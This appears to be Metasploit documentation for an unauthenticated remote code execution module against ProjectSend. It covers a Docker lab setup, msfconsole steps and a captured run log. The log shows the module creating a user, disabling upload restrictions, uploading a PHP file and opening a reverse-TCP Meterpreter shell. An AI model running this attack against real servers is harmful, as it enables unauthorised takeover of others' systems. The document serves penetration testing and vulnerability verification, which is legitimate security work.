## Vulnerable Application
ProjectSend is a web application used for sharing files with clients.

Due to POST parameters being executed before checking user permissions,
it is possible to perform a series of actions that can result in unauthenticated Remote Code Execution (RCE)
on vulnerable versions of ProjectSend.

This module has been tested against ProjectSend versions r1295 through r1605 on Linux.

The easiest way to obtain a vulnerable version of ProjectSend is by deploying it using Docker, as pre-made images exist for the software.
The following Docker Compose file can be used to set up a vulnerable environment.

```
---
    services:
      projectsend:
        image: lscr.io/linuxserver/projectsend:version-r1605
        container_name: projectsend
        environment:
          - PUID=1000
          - PGID=1000
          - TZ=Etc/UTC
          - MAX_UPLOAD=5000
        volumes:
          - ./projectsend/config:/config
          - ./projectsend/data:/data
        ports:
          - 80:80
        restart: unless-stopped
      db:
        image: mariadb
        restart: unless-stopped
        container_name: db
        volumes:
          - ./mariadb_data:/var/lib/mysql
        environment:
          MYSQL_ROOT_PASSWORD: password
          MYSQL_DATABASE: projectsend
          MYSQL_USER: projectsend
          MYSQL_PASSWORD: projectsend
```
After launching the containers, ProjectSend requires an initial configuration,
which can be completed by accessing it via port 80 on localhost.

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/linux/http/projectsend_unauth_rce`
4. Set remote hosts: `set RHOSTS <ip>`
5. Set remote port: `set RPORT <port>`
6. Set the path to ProjectSend: `set TARGETURI <URI>`
7. Set local host: `set LHOST <local ip>`
8. Do: `run`
9. You should get a shell

```
msf6 exploit(linux/http/projectsend_unauth_rce) > options

Module options (exploit/linux/http/projectsend_unauth_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The TARGETURI for ProjectSend
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.20     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP Command
```

## Options
N/A - Only default options.

## Scenarios
```
msf6 exploit(linux/http/projectsend_unauth_rce) > run

[*] Started reverse TCP handler on 192.168.1.20:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[+] Client registration successfully enabled
[+] User alvin.padberg created with password lrASo3iM
[*] Disabling upload restrictions...
[*] Logging in as alvin.padberg...
[+] Logged in as alvin.padberg
[+] Successfully uploaded PHP file: sX1A4FCH.php
[*] Sending stage (39927 bytes) to 192.168.1.20
[*] Meterpreter session 1 opened (192.168.1.20:4444 -> 192.168.1.20:56675) at 2024-09-23 19:01:29 +0200
[*] Logging in as alvin.padberg...
[+] Logged in as alvin.padberg
[+] Client registration successfully disabled
[*] Enabling upload restrictions...

meterpreter > sysinfo
Computer    : 1480205e55c2
OS          : Linux 1480205e55c2 6.6.26-linuxkit #1 SMP Sat Apr 27 04:13:19 UTC 2024 aarch64
Meterpreter : php/linux
```
